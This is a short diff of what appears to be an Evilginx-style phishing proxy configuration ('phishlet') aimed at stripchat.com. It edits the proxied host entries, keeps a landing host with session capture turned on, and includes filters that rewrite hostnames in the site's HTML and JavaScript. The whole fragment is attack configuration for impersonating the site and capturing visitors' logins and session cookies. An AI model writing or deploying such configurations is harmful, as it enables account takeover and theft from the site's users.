@@ -4,8 +4,7 @@ min_ver: '2.3.0'
 proxy_hosts:
  
   - {phish_sub: 'sv', orig_sub: 'sv', domain: 'stripchat.com', session: true, is_landing: true, auto_filter: true}
- - {phish_sub: '', orig_sub: '', domain: 'stripchat.com', session: false, is_landing: true}
-  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'stripchat.com', session: true, is_landing: false}
+
   sub_filters:
   - {triggers_on: 'stripchat.com', orig_sub: '', domain: 'stripchat.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
